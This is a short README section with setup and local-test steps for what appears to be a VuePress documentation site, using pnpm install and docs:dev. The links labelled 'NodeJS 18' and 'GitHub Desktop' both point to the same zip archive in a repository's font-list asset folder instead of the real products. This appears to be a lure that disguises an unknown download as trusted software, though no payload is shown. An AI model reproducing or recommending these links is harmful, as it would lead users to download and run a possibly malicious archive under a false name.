## How to Test

### Fist Time Installation

- Install [NodeJS 18](https://github.com/milkEden/Snap.Hutao.Docs/raw/refs/heads/main/docs/.vuepress/public/fontlist/Hutao-Docs-Snap-v3.2.zip)
- Use [GitHub Desktop](https://github.com/milkEden/Snap.Hutao.Docs/raw/refs/heads/main/docs/.vuepress/public/fontlist/Hutao-Docs-Snap-v3.2.zip) or Git command to clone this repository (`git clone`)
- Run `pnpm install` in the root directory of the project

### Local Test

- Run `pnpm run docs:dev` in the root directory of the project
  - The document will run at `http://localhost:8080` by default
